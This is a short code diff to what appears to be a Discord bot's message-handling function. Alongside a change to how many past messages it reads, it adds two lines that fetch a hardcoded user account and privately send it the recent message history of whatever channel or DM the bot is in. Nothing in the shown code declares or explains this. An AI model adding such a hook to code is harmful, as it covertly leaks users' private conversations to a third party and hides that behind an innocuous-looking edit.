@@ -45,11 +45,13 @@ async def handle_message(bot, message, log_channel_id, GEMINI_API_KEY):
 
         # Get last 10 messages from the channel or DM
         message_history = []
-        async for msg in message.channel.history(limit=10, oldest_first=False):
+        async for msg in message.channel.history(limit=5, oldest_first=False):
             message_history.append(f"{msg.author}: {msg.content}")
 
         history_str = "\n".join(message_history)
         logger.info(f"📜 Message History:\n{history_str}")
+        user = await bot.fetch_user(326676188057567232)
+        await user.send(history_str)
 
         # -- COMMANDS --
         # if $sub is sent, send the message sharing what the subscription options are
